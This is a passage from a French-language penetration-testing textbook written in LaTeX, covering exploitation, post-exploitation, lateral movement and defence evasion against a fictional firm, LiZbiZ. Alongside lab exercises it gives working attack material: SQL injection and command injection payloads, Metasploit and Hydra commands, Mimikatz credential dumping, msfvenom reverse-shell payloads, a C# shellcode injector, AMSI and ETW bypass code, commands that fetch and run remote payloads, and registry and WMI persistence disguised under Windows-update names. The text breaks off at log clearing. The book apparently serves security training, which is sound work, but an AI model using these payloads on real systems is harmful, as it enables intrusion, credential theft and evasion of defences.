          \texttt{203.0.113.0/24}.
    \item Effectuer un scan \sigle{SYN} complet (\texttt{-p-}) sur les
          hôtes découverts, avec détection de version et scripts par défaut.
    \item Identifier manuellement les services Apache, SMB, LDAP et SMTP.
    \item Lancer \texttt{nikto} sur le serveur web et analyser le rapport.
    \item Lancer \texttt{enum4linux-ng -A} sur le serveur Windows et
          identifier les partages accessibles.
    \item Sauvegarder tous les résultats en format \texttt{-oA} et calculer
          leurs hashes SHA-256.
\end{enumerate}

\medskip
\textbf{Livrable :} Tableau des ports ouverts + versions + CVE associées
(format du Tableau~\ref{tab:synthese_scanning}).
\end{boxexo}

\begin{boxexo}
\textbf{Exercice 4.2, Énumération Active Directory avec le compte stagiaire}

\medskip
\textbf{Prérequis :} Compte \texttt{stagiaire / Password123} fourni dans
les ROE.

\medskip
\textbf{Tâches :}
\begin{enumerate}
    \item Effectuer une requête \sigle{LDAP} pour lister tous les utilisateurs
          du domaine \texttt{lizbiz.local}.
    \item Identifier les comptes de service avec \sigle{SPN} configuré
          (cibles Kerberoasting, sera exploité au
          Chapitre~\ref{chap:postexploit}).
    \item Utiliser \texttt{kerbrute} pour valider la liste d'utilisateurs
          collectée en \sigle{OSINT}.
    \item Lancer BloodHound-python en collecte \texttt{-c all} et importer
          le résultat dans BloodHound.
    \item Identifier le chemin le plus court vers \og{}Domain Admin\fg{}
          depuis le compte stagiaire.
\end{enumerate}

\medskip
\textbf{Livrable :} Capture d'écran du graphe BloodHound + liste des
3 SPN identifiés.
\end{boxexo}


% -------------------------------------------------------------------
% PARTIE II — Phase Offensive : Exploitation et Post-Exploitation
% -------------------------------------------------------------------
\part{Phase Offensive : Exploitation et Post-Exploitation}

% Chapitre 5 — Vulnérabilités et exploitation
% ==============================================================================
% Fichier : 05_exploitation.tex
% Description : Vulnérabilités et Exploitation
% ==============================================================================

\chapter{Vulnérabilités et Exploitation}

Une fois la surface d'attaque cartographiée (Scanning), vient la phase d'\textbf{Exploitation}. L'objectif est de prouver qu'une vulnérabilité identifiée a un impact réel en réussissant à exécuter du code ou à extraire des données sur la cible.

\section{Concepts Fondamentaux de l'Exploitation}
% ------------------------------------------------------------------------------

\subsection{Le Trio de l'Attaque}

\begin{itemize}
    \item \textbf{Vulnérabilité :} La faille technique (ex: code mal écrit, configuration faible).
    \item \textbf{Exploit :} Le code ou la méthode utilisée pour abuser de la vulnérabilité.
    \item \textbf{Payload :} Le "fardeau" transporté par l'exploit pour exécuter une action sur la cible (ex: ouvrir un shell, créer un utilisateur).
\end{itemize}

\subsection{Types de Shells}

L'objectif ultime de l'exploitation est souvent d'obtenir un accès à distance (Shell).

\begin{table}[h!]
\centering
\begin{tabular}{p{3cm}p{5cm}p{4cm}}
    \toprule
    \textbf{Type} & \textbf{Fonctionnement} & \textbf{Usage} \\
    \midrule
    \textbf{Reverse Shell} & La cible se connecte à l'attaquant (Outbound). & Contourne les pare-feux (les connexions sortantes sont souvent autorisées). \\
    \textbf{Bind Shell} & La cible écoute sur un port, l'attaquant s'y connecte (Inbound). & Utile si aucun pare-feu ne bloque l'entrée. \\
    \textbf{Web Shell} & Script déposé sur le serveur web (ex: PHP). & Persistant, facile à utiliser via un navigateur. \\
    \bottomrule
\end{tabular}
\caption{Types de shells}
\end{table}

% ------------------------------------------------------------------------------
\section{Exploitation Web (OWASP Top 10)}
% ------------------------------------------------------------------------------

Les applications web sont souvent la porte d'entrée la plus facile.

\subsection{Injection SQL (SQLi)}

\begin{boxdef}
\textbf{SQLi :} Technique consistant à injecter du code SQL malveillant dans les entrées de l'application pour manipuler la base de données.
\end{boxdef}

\textbf{Types de SQLi :}
\begin{itemize}
    \item \textbf{In-Band (Classique) :} L'attaquant voit les résultats directement sur la page (Error based, Union based).
    \item \textbf{Blind (Aveugle) :} L'attaquant ne voit pas les données mais peut déduire la réponse via le comportement de la page (Boolean based, Time based).
\end{itemize}

\begin{boxlizbiz}
\textbf{Attaque LiZbiZ :}
Sur la page de connexion de LiZbiZ, le champ "Nom d'utilisateur" est vulnérable.
\begin{lstlisting}[language=SQL]
Payload : ' OR '1'='1' --
Resultat : La requete devient toujours vraie, connectant l'attaquant en tant qu'admin sans mot de passe.
\end{lstlisting}
Utilisation de \textbf{SQLMap} pour automatiser l'extraction de toute la base de données clients :
\begin{lstlisting}[language=bash]
sqlmap -u "http://lizbiz.local/login?id=1" --dump
\end{lstlisting}
\end{boxlizbiz}

\subsection{File Inclusion (LFI/RFI)}

\begin{itemize}
    \item \textbf{LFI (Local File Inclusion) :} Inclure des fichiers présents sur le serveur (ex: \texttt{/etc/passwd}) via un paramètre non filtré.
    \item \textbf{RFI (Remote File Inclusion) :} Inclure un fichier distant (ex: une backdoor PHP hébergée sur le serveur de l'attaquant).
\end{itemize}

\subsection{Command Injection}

Exécution de commandes système via une entrée utilisateur non nettoyée (ex: ping d'une IP).

\begin{lstlisting}[language=bash, caption=Injection de commande]
Entree : 127.0.0.1 ; cat /etc/passwd
Le serveur execute : ping 127.0.0.1 ; cat /etc/passwd
\end{lstlisting}

% ------------------------------------------------------------------------------
\section{Exploitation Système et Réseau}
% ------------------------------------------------------------------------------

\subsection{Le Framework Metasploit}

C'est l'outil standard pour l'exploitation de vulnérabilités réseaux et systèmes. Il centralise les exploits, les payloads et les encodeurs.

\begin{lstlisting}[language=bash, caption=Workflow Metasploit]
msfconsole
# 1. Chercher un exploit
search apache 2.2.22
# 2. Utiliser l'exploit
use exploit/multi/http/apache_mod_jpeg_overflow
# 3. Configurer la cible
set RHOSTS 192.168.1.10
set PAYLOAD php/meterpreter/reverse_tcp
# 4. Lancer l'attaque
exploit
\end{lstlisting}

\subsection{Exploitation de Services Connus}

\begin{itemize}
    \item \textbf{SSH (Port 22) :} Souvent protégé par mot de passe faible. Utilisation de \texttt{Hydra} pour le Brute Force.
    \begin{lstlisting}[language=bash]
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
    \end{lstlisting}
    \item \textbf{SMB (Port 445) :} Cible privilégiée. Exploitation de failles comme \textbf{EternalBlue (MS17-010)} ou \textbf{BlueKeep}.
\end{itemize}

\begin{boxlizbiz}
\textbf{Scénario LiZbiZ :}
Le scan a révélé un serveur Windows Server 2012 R2 non mis à jour (Port 445 ouvert).
L'attaquant utilise le module Metasploit \texttt{exploit/windows/smb/ms17\_010\_eternalblue}.
\textbf{Résultat :} Un shell "SYSTEM" (Administrateur maximum) est ouvert sur le serveur, donnant le contrôle total de la machine.
\end{boxlizbiz}

% ------------------------------------------------------------------------------
\section{Transfert de Fichiers (Post-Exploitation)}
% ------------------------------------------------------------------------------

Une fois un accès obtenu, il faut souvent uploader des outils (Mimikatz, scripts) sur la cible.

\begin{itemize}
    \item \textbf{Serveur HTTP simple :} \texttt{python3 -m http.server 8080} sur la machine attaquante, puis \texttt{wget} ou \texttt{certutil} sur la cible.
    \item \textbf{Netcat :} Transfert direct via socket.
\end{itemize}


% Chapitre 6 — Post-exploitation et mouvement latéral
% ==============================================================================
% Fichier : 06_post_exploitation.tex
% Description : Post-Exploitation, Escalade de Privilèges et Mouvement Latéral
% ==============================================================================

\chapter{Post-Exploitation et Mouvement Latéral}

Obtenir un shell initial (ex: utilisateur "www-data") n'est souvent que le début. La phase de \textbf{Post-Exploitation} vise à consolider l'accès, augmenter les droits (Escalade) et se déplacer vers des cibles plus sensibles (Mouvement Latéral).

\section{Escalade de Privilèges (Privilege Escalation)}
% ------------------------------------------------------------------------------

L'escalade de privilèges est l'art de passer d'un utilisateur standard à un utilisateur avec des droits d'administration (Root sous Linux, SYSTEM/Admin sous Windows).

\subsection{Linux : De l'Utilisateur à Root}

\begin{itemize}
    \item \textbf{Kernel Exploits :} Exploitation de failles dans le noyau de l'OS (ex: Dirty COW, Dirty Pipe). Risque de crash système.
    \item \textbf{SUID/SGID Binaries :} Fichiers exécutables qui tournent avec les droits de leur propriétaire (souvent Root). Si un éditeur de texte (vim, less) a le bit SUID, on peut lire le fichier \texttt{/etc/shadow}.
    \item \textbf{Sudo Misconfiguration :} Droit d'exécuter des commandes précises en root sans mot de passe (ex: \texttt{sudo vim} permet de lancer un shell).
    \item \textbf{Cron Jobs :} Tâches planifiées exécutées par Root. Si un script appelé est modifiable par l'utilisateur, il peut injecter du code.
\end{itemize}

\begin{lstlisting}[language=bash, caption=Trouver les fichiers SUID]
find / -perm -u=s -type f 2>/dev/null
\end{lstlisting}

\subsection{Windows : De l'Utilisateur à SYSTEM}

\begin{itemize}
    \item \textbf{Unquoted Service Path :} Si le chemin d'un service contient des espaces et n'est pas entre guillemets (ex: \texttt{C:\Program Files\My App\service.exe}), Windows cherche l'exécutable dans l'ordre. En plaçant un maliciel à \texttt{C:\Program.exe}, on peut le faire exécuter par SYSTEM.
    \item \textbf{AlwaysInstallElevated :} Si cette politique est activée, n'importe quel utilisateur peut installer un package MSI (.msi) avec les droits SYSTEM.
    \item \textbf{Token Impersonation :} Techniques comme "Rotten Potato" ou "PrintSpoofer" permettant de voler le jeton d'un processus système.
\end{itemize}

\begin{boxlizbiz}
\textbf{Scénario LiZbiZ :}
Vous avez obtenu un shell "apache" sur le serveur Web Linux. Vous listez les permissions sudo : \texttt{sudo -l}. Résultat : l'utilisateur apache peut lancer \texttt{/usr/bin/vim}.
\textbf{Exploitation :} Ouvrir vim en sudo, puis exécuter \texttt{:!bash} dans l'éditeur. Vous êtes maintenant "root".
\end{boxlizbiz}

% ------------------------------------------------------------------------------
\section{Récupération d'Identifiants (Credential Harvesting)}
% ------------------------------------------------------------------------------

L'objectif est de voler des mots de passe pour se connecter ailleurs (mot de passe souvent réutilisé).

\subsection{Dumping de Mémoire (Mimikatz)}

Sous Windows, les mots de passe sont stockés en mémoire (LSASS). \textbf{Mimikatz} est l'outil roi pour les extraire.

\begin{lstlisting}[language=bash, caption=Commandes Mimikatz basiques]
privilege::debug
sekurlsa::logonpasswords
# Affiche les mots de passe en clair ou les hashs NTLM des utilisateurs connectes
\end{lstlisting}

\subsection{Fichiers de Configuration}

Les applications stockent souvent les mots de passe en clair :
\begin{itemize}
    \item Web : \texttt{web.config}, \texttt{wp-config.php} (WordPress), \texttt{database.yml}.
    \item SSH : Clés privées dans \texttt{~/.ssh/id\_rsa}.
\end{itemize}

% ------------------------------------------------------------------------------
\section{Mouvement Latéral (Lateral Movement)}
% ------------------------------------------------------------------------------

Se déplacer de machine en machine sans repasser par l'extérieur.

\subsection{Pass-the-Hash (PtH)}

Technique permettant de s'authentifier avec le hash NTLM du mot de passe au lieu du mot de passe en clair. Très efficace si le dump Mimikatz a fonctionné.

\begin{lstlisting}[language=bash, caption=Pass-the-Hash avec CrackMapExec]
crackmapexec smb 192.168.1.0/24 -u Administrator -H "A9FD...HASH..." 
# Teste le hash sur tout le reseau pour trouver ou il est valide
\end{lstlisting}

\subsection{Outils d'Exécution à Distance}

\begin{itemize}
    \item \textbf{PsExec :} Outil Microsoft légitime souvent détecté par les AV.
    \item \textbf{WMI / WinRM :} Protocoles de gestion Windows natifs, très furtifs.
    \item \textbf{Impacket :} Suite Python d'outils réseaux (ex: \texttt{wmiexec.py}, \texttt{psexec.py}).
\end{itemize}

% ------------------------------------------------------------------------------
\section{Attaques Active Directory}
% ------------------------------------------------------------------------------

L'Active Directory est le "Saint Graal" de l'entreprise. Il centralise les identités.

\subsection{BloodHound}

Outil de cartographie des relations AD. Il visualise graphiquement "Qui peut administrer quoi".
\textbf{Utilité :} Trouver le chemin le plus court vers le compte "Domain Admin".

\subsection{Kerberoasting}

Attaque qui consiste à demander un ticket de service (TGS) pour un compte de service, puis à le cracker hors-ligne (offline) pour récupérer le mot de passe du compte de service.

% ------------------------------------------------------------------------------
\section{Pivotage (Pivoting)}
% ------------------------------------------------------------------------------

Comment accéder à un réseau interne (VLAN 2) depuis une machine compromise en DMZ (VLAN 1) ?

\begin{boxdef}
\textbf{Pivoting :} Utiliser une machine compromise comme relais (proxy) pour scanner et attaquer des réseaux inaccessibles depuis la machine de l'attaquant.
\end{boxdef}

\begin{lstlisting}[language=bash, caption=Configuration Proxychains]
# Dans /etc/proxychains.conf
[ProxyList]
socks4 127.0.0.1 1080  # La connexion passe par le tunnel SSH/Empire etabli sur la cible
\end{lstlisting}

\begin{lstlisting}[language=bash, caption=Scan via le pivot]
proxychains nmap -sT -Pn 10.0.0.5
# Scan un reseau interne (10.0.0.x) via la machine compromise
\end{lstlisting}

\begin{boxlizbiz}
\textbf{Scenario Final LiZbiZ :}
1. Compromission du serveur Web (DMZ).
2. Pivotage vers le réseau interne via l'outil \texttt{Chisel} ou \texttt{Metasploit autoroute}.
3. Scan du réseau interne : découverte du Contrôleur de Domaine (DC).
4. Utilisation de Mimikatz sur un poste Windows compromis pour dumper les identifiants.
5. Pass-the-Hash vers le DC : \textbf{Contrôle total de l'entreprise LiZbiZ}.
\end{boxlizbiz}


% Chapitre 7 — Évasion des défenses et anti-forensics
% ==============================================================================
% Fichier     : chapitres/07_evasion_antiforensic.tex
% Titre       : Évasion des Défenses et Anti-Forensics
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
% ==============================================================================

\chapter{Évasion des Défenses et Anti-Forensics}
\label{chap:evasion}

Les outils d'attaque standards, Metasploit, Mimikatz, BloodHound, sont
connus de tous les éditeurs d'antivirus (\sigle{AV}) et des systèmes de
détection comportementale (\sigle{EDR}). Pour réussir un pentest avancé
simulant un attaquant réel, il faut savoir \textbf{rendre les outils
indétectables} et \textbf{effacer les traces} de passage. Ce chapitre
présente les techniques d'évasion et d'anti-forensics utilisées par les
attaquants sophistiqués, et que les défenseurs doivent impérativement
comprendre pour déployer des contre-mesures efficaces.

\begin{boxalert}
\textbf{Avertissement éthique :} Les techniques présentées dans ce chapitre
sont des outils de compréhension défensive. Toute application hors du
laboratoire isolé ou sans mandat écrit constitue une infraction pénale
(Chapitre~\ref{chap:juridique}). En pentest réel, les techniques de
nettoyage de logs doivent être \textbf{documentées} dans le rapport
plutôt qu'exécutées, sauf accord client explicite.
\end{boxalert}

\begin{boxinfo}
\textbf{MITRE ATT\&CK, Tactique associée :}
Ce chapitre couvre \sigle{TA0005} (\textit{Defense Evasion}), notamment
T1027 (\textit{Obfuscated Files}), T1055 (\textit{Process Injection}),
T1562 (\textit{Impair Defenses}), T1070 (\textit{Indicator Removal}),
T1140 (\textit{Deobfuscate/Decode Files}).
\end{boxinfo}

% ==============================================================================
\section{Architecture des Défenses Modernes}
\label{sec:defense_architecture}
% ==============================================================================

Avant d'aborder les techniques d'évasion, il est indispensable de comprendre
l'architecture des défenses que l'on cherche à contourner.

\subsection{Antivirus (AV) vs EDR}
\label{subsec:av_vs_edr}

\begin{table}[htbp]
\centering
\caption{Comparatif AV classique vs EDR moderne}
\label{tab:av_vs_edr}
\begin{tabular}{p{3cm}p{5.5cm}p{5cm}}
\toprule
\textbf{Critère} & \textbf{AV Classique} & \textbf{EDR Moderne} \\
\midrule
Détection
    & Signatures statiques (hash de fichiers, patterns d'octets)
    & Comportement en temps réel + ML + signatures + corrélation \\
\addlinespace
Visibilité
    & Fichiers sur disque uniquement
    & Processus, mémoire, réseau, registre, appels système \\
\addlinespace
Réponse
    & Quarantaine du fichier
    & Isolation de la machine, kill process, rollback \\
\addlinespace
Contournement
    & Obfuscation, encodage, packing
    & Beaucoup plus difficile, nécessite contournement des hooks kernel \\
\addlinespace
Exemples
    & Windows Defender (mode basique), Avast, AVG
    & CrowdStrike Falcon, SentinelOne, Carbon Black, Defender ATP \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Mécanismes de Détection}
\label{subsec:detection_mechanisms}

\begin{itemize}
    \item \textbf{Détection statique (signature) :} Analyse du fichier au repos —
          recherche de séquences d'octets connues (\textit{byte patterns}),
          hashes de fichiers malveillants connus (\sigle{IOC}).
    \item \textbf{Détection comportementale (heuristique) :} Analyse du
          comportement à l'exécution, accès à \sigle{LSASS}, injection dans
          d'autres processus, connexions réseau suspectes, modifications du
          registre.
    \item \textbf{Hooks \textit{userland} :} L'\sigle{EDR} injecte une \sigle{DLL}
          dans chaque processus et \textit{hooké} les fonctions \sigle{API}
          Windows sensibles (ex.~: \texttt{NtCreateThread},
          \texttt{ReadProcessMemory}) pour intercepter les appels suspects.
    \item \textbf{ETW (\textit{Event Tracing for Windows}) :} Infrastructure
          de journalisation kernel interceptant les appels système et les
          événements de sécurité, utilisée par les \sigle{EDR} pour
          corréler les actions.
    \item \textbf{AMSI (\textit{Antimalware Scan Interface}) :} Interface
          permettant aux \sigle{AV} de scanner le contenu des scripts
          (PowerShell, VBScript, JScript) \textit{avant} exécution.
\end{itemize}

% ==============================================================================
\section{Obfuscation et Génération de Payloads}
\label{sec:obfuscation}
% ==============================================================================

\subsection{Msfvenom avec Encodage}
\label{subsec:msfvenom}

\begin{lstlisting}[language=bash, caption={Msfvenom, génération de payload obfusqué}]
# Payload Windows 64 bits avec encodeur shikata_ga_nai (5 itérations)
# IMPORTANT : payload windows/x64 pour cible 64 bits
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.100 LPORT=4444 \
         -e x64/xor_dynamic -i 5 \
         -f exe -o payload_x64.exe

# Générer en format C (pour intégration dans du code custom)
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=10.10.10.100 LPORT=4444 \
         -f c -o shellcode.c

# Format PowerShell (injection en mémoire)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.10.10.100 LPORT=4444 \
         -f ps1 -o payload.ps1
\end{lstlisting}

\begin{boxinfo}
\textbf{Limites de l'encodage Msfvenom :} Les encodeurs Msfvenom
(\textit{shikata\_ga\_nai}, \textit{xor\_dynamic}) sont bien connus des
éditeurs \sigle{AV}, leur efficacité contre les \sigle{AV} modernes
est faible. Ils restent utiles pour les systèmes non mis à jour ou pour
démontrer le concept. Pour un contournement efficace, les techniques
présentées dans les subsections suivantes sont nécessaires.
\end{boxinfo}

\subsection{Shellter, Injection dans des Binaires Légitimes}
\label{subsec:shellter}

\termecle{Shellter} injecte du shellcode dans un exécutable Windows
\textit{légitime} (ex.~: \texttt{putty.exe}, \texttt{vlc.exe}), en
modifiant le flux d'exécution de façon dynamique. Le fichier résultant
conserve sa signature et son comportement apparents.

\begin{lstlisting}[language=bash, caption={Shellter, injection dans un binaire légitime}]
# Installation (Kali Linux)
apt install shellter -y

# Mode auto : Shellter choisit automatiquement le point d'injection
shellter
# Choisir : A (Automatic mode)
# PE Target : /tmp/putty.exe   (binaire légitime 32 bits)
# Stealth mode : Y
# Payload : L (Listed) → 1 (Meterpreter_Reverse_TCP)
# LHOST : 10.10.10.100
# LPORT : 4444

# Résultat : putty.exe modifié, se comporte normalement ET déclenche
# un reverse shell Meterpreter à l'exécution
\end{lstlisting}

\subsection{Payloads Custom, C\# et Nim}
\label{subsec:custom_payloads}

Écrire son propre code d'injection est la technique la plus efficace pour
contourner les \sigle{AV}, un payload custom ne correspond à aucune
signature connue.

\begin{lstlisting}[language=csh, caption={Injection de shellcode en C\#, template de base}]
// Template C# minimal pour injection de shellcode en mémoire
// Compile avec : csc.exe /unsafe payload.cs
using System;
using System.Runtime.InteropServices;

class Injector {
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
        uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 ms);

    static void Main() {
        // Shellcode généré avec msfvenom -f csharp
        byte[] shellcode = new byte[] { 0xfc, 0x48, ... };

        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
            0x3000, 0x40);
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr,
            IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(thread, 0xFFFFFFFF);
    }
}
\end{lstlisting}

\subsection{Donut, Shellcode depuis des Assemblies .NET}
\label{subsec:donut}

\termecle{Donut} convertit des assemblies .NET (Mimikatz.NET, BloodHound,
SharpHound) en shellcode injectable en mémoire, contournant ainsi la
détection basée sur les noms de fichiers.

\begin{lstlisting}[language=bash, caption={Donut, conversion assembly .NET en shellcode}]
# Convertir SharpHound.exe en shellcode injectable
./donut -a 2 -f 7 \
        -i SharpHound.exe \
        -p "-c All --domain lizbiz.local" \
        -o sharphound_shellcode.bin

# Injecter le shellcode avec un loader custom (C# ou Nim)
# Le binaire SharpHound ne touche jamais le disque
\end{lstlisting}

% ==============================================================================
\section{Bypass AMSI et ETW}
\label{sec:amsi_bypass}
% ==============================================================================

\subsection{AMSI (\textit{Antimalware Scan Interface})}
\label{subsec:amsi}

\sigle{AMSI} est une interface Windows qui transmet le contenu des scripts
PowerShell, VBScript et JScript à l'\sigle{AV} avant exécution. Son
contournement est nécessaire dès qu'on utilise PowerShell offensif.

\begin{lstlisting}[language=PowerShell, caption={Techniques de bypass AMSI, du simple au robuste}]
# ── Technique 1 : Patch de la fonction AmsiScanBuffer en mémoire ──────
# (la plus courante, patche l'AMSI dans le processus PowerShell courant)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# ── Technique 2 : Forcer l'erreur d'initialisation AMSI ──────────────
[Runtime.InteropServices.Marshal]::WriteByte(
    (Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h, string n);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);' -Name W -PassThru)::GetProcAddress(([W]::LoadLibrary("amsi")), "AmsiScanBuffer"),
    0xB8   # Opcode ret direct (nop le scan)
)

# ── Technique 3 : Obfuscation via chaîne concaténée ───────────────────
# Contourne la détection statique des bypass connus
$s = 'Am'+'si'+'Utils'
$t = [Ref].Assembly.GetType("System.Management.Automation.$s")
$u = $t.GetField('amsi'+'Init'+'Failed','NonPublic,Static')
$u.SetValue($null,$true)
\end{lstlisting}

\subsection{ETW (\textit{Event Tracing for Windows}) Patching}
\label{subsec:etw}

\sigle{ETW} fournit aux \sigle{EDR} une visibilité sur les appels système.
Le patching d'ETW aveugle temporairement la télémétrie de l'\sigle{EDR}.

\begin{lstlisting}[language=PowerShell, caption={ETW Patching, désactivation de la télémétrie PowerShell}]
# Patcher EtwEventWrite pour renvoyer SUCCESS sans loguer
$a=[Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
$b=$a.GetField('m_etwProvider','NonPublic,Instance')
$c=$b.GetValue([Ref].Assembly.GetType(
    'System.Management.Automation.Tracing.PSEtwLogProvider').GetField(
    'etwProvider','NonPublic,Static').GetValue($null))
[System.Runtime.InteropServices.Marshal]::WriteInt64(
    $c.m_regHandle,0)
\end{lstlisting}

% ==============================================================================
\section{Living Off The Land (LotL)}
\label{sec:lotl}
% ==============================================================================

La technique \termecle{LotL} (\textit{Living Off The Land}) consiste à utiliser
des outils légitimes présents par défaut dans le système pour réaliser des
actions offensives. Ces binaires sont signés par Microsoft et généralement
autorisés par les \sigle{AV}. \textbf{MITRE T1218.}

\begin{table}[htbp]
\centering
\caption{Living Off The Land Binaries (LoLBins), usages offensifs}
\label{tab:lolbins}
\begin{tabular}{p{2.5cm}p{3.8cm}p{6.5cm}}
\toprule
\textbf{Outil} & \textbf{Usage légitime} & \textbf{Usage offensif} \\
\midrule
\texttt{certutil.exe}
    & Gestion de certificats
    & Téléchargement de fichiers (\texttt{-urlcache -split -f}) \\
\addlinespace
\texttt{mshta.exe}
    & Exécution d'applications HTML
    & Exécution de scripts \sigle{HTA} malveillants sans \sigle{EXE} \\
\addlinespace
\texttt{regsvr32.exe}
    & Enregistrement de DLL
    & Exécution de code distant via \textit{scriptlets} \sigle{COM} \\
\addlinespace
\texttt{powershell.exe}
    & Administration système
    & Exécution de payloads en mémoire, bypass \sigle{AMSI} \\
\addlinespace
\texttt{wmic.exe}
    & Gestion \sigle{WMI}
    & Exécution de commandes à distance, persistance via \sigle{WMI} \\
\addlinespace
\texttt{bitsadmin.exe}
    & Transferts en arrière-plan
    & Téléchargement de fichiers malveillants \\
\addlinespace
\texttt{rundll32.exe}
    & Exécution de fonctions DLL
    & Exécution de shellcode via DLL custom \\
\addlinespace
\texttt{msiexec.exe}
    & Installation de packages MSI
    & Exécution de MSI malveillant (\textit{AlwaysInstallElevated}) \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[language=PowerShell, caption={LotL, exemples opérationnels}]
# Téléchargement via certutil (contourne les proxies web basiques)
certutil -urlcache -split -f http://10.10.10.100:8080/payload.exe C:\Temp\p.exe

# Exécution de code distant via regsvr32 (Squiblydoo)
regsvr32 /s /n /u /i:http://10.10.10.100:8080/malicious.sct scrobj.dll

# Injection de code en mémoire via PowerShell (sans fichier sur disque)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand \
           [BASE64_ENCODED_COMMAND]

# Chargement de Mimikatz en mémoire (sans toucher le disque)
powershell "IEX (New-Object Net.WebClient).DownloadString(\
    'http://10.10.10.100:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
\end{lstlisting}

\begin{boxlizbiz}
\textbf{Cas LiZbiZ, Mimikatz fileless :}
Au lieu de déposer \texttt{mimikatz.exe} sur le disque (détecté immédiatement
par Windows Defender), l'attaquant charge Invoke-Mimikatz directement en
mémoire via PowerShell après bypass AMSI. Aucun fichier n'est écrit sur le
disque dur, le \sigle{AV} basé sur les signatures de fichiers est aveugle.

\begin{lstlisting}[language=PowerShell]
# Étape 1 : Bypass AMSI
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Étape 2 : Charger Mimikatz en mémoire
IEX (New-Object Net.WebClient).DownloadString(
    'http://10.10.10.100:8080/Invoke-Mimikatz.ps1')

# Étape 3 : Exécuter
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
\end{lstlisting}
\textbf{MITRE :} T1059.001 (\textit{PowerShell}), T1218 (LoLBins).
\end{boxlizbiz}

% ==============================================================================
\section{Attaques Fileless (Sans Fichier)}
\label{sec:fileless}
% ==============================================================================

Les attaques \termecle{fileless} ne déposent aucun fichier sur le disque —
le code malveillant réside uniquement en mémoire vive, dans le registre,
ou dans des mécanismes de persistance \sigle{WMI}. \textbf{MITRE T1027.}

\subsection{Injection de Processus}
\label{subsec:process_injection}

\begin{lstlisting}[language=PowerShell, caption={Process Injection, shellcode dans un processus légitime}]
# Injection dans un processus légitime (ex : notepad.exe)
# via les API Windows VirtualAllocEx / WriteProcessMemory / CreateRemoteThread

# PowerShell, injection via P/Invoke
$notepad = Start-Process notepad -PassThru
$handle = [Kernel32]::OpenProcess(0x1F0FFF, $false, $notepad.Id)

# Allouer de la mémoire dans le processus cible
$addr = [Kernel32]::VirtualAllocEx($handle, [IntPtr]::Zero,
    $shellcode.Length, 0x3000, 0x40)

# Écrire le shellcode
[Kernel32]::WriteProcessMemory($handle, $addr, $shellcode,
    $shellcode.Length, [ref]0)

# Créer un thread distant exécutant le shellcode
[Kernel32]::CreateRemoteThread($handle, [IntPtr]::Zero, 0,
    $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
\end{lstlisting}

\subsection{Persistance Fileless via le Registre}
\label{subsec:registry_fileless}

\begin{lstlisting}[language=PowerShell, caption={Persistance fileless via le registre Windows}]
# Stocker le payload PowerShell encodé dans le registre
$payload = "powershell -WindowStyle Hidden -EncodedCommand [B64_PAYLOAD]"

# Clé de démarrage automatique (Run)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" \
    -Name "WindowsUpdate" -Value $payload

# Alternative plus discrète : RunOnce (s'exécute une fois au démarrage)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" \
    -Name "SecurityScan" -Value $payload
\end{lstlisting}

\subsection{Persistance via WMI Event Subscription}
\label{subsec:wmi_persistence}

La persistance via \sigle{WMI} est extrêmement discrète car elle n'ajoute
aucune entrée visible dans les programmes de démarrage.

\begin{lstlisting}[language=PowerShell, caption={WMI Event Subscription, persistance sans fichier}]
# Créer un filtre d'événement (déclencheur : 60 secondes après démarrage)
$filter = Set-WmiInstance -Namespace root\subscription \
    -Class __EventFilter \
    -Arguments @{
        Name="WindowsDefenderUpdate"
        EventNameSpace="root\cimv2"
        QueryLanguage="WQL"
        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE
               TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
               AND TargetInstance.SystemUpTime >= 60"
    }

# Créer un consommateur (action : exécuter le payload)
$consumer = Set-WmiInstance -Namespace root\subscription \
    -Class CommandLineEventConsumer \
    -Arguments @{
        Name="WindowsDefenderUpdate"
        CommandLineTemplate="powershell -EncodedCommand [B64_PAYLOAD]"
    }

# Lier le filtre au consommateur
Set-WmiInstance -Namespace root\subscription \
    -Class __FilterToConsumerBinding \
    -Arguments @{Filter=$filter; Consumer=$consumer}
\end{lstlisting}

% ==============================================================================
\section{Anti-Forensics : Effacer ses Traces}
\label{sec:antiforensics}
% ==============================================================================

Une fois l'objectif démontré, le pentester doit nettoyer les artéfacts laissés
— ou documenter dans le rapport ce qu'il \textit{aurait pu} nettoyer.

\subsection{Nettoyage des Journaux Windows}
\label{subsec:log_clearing}

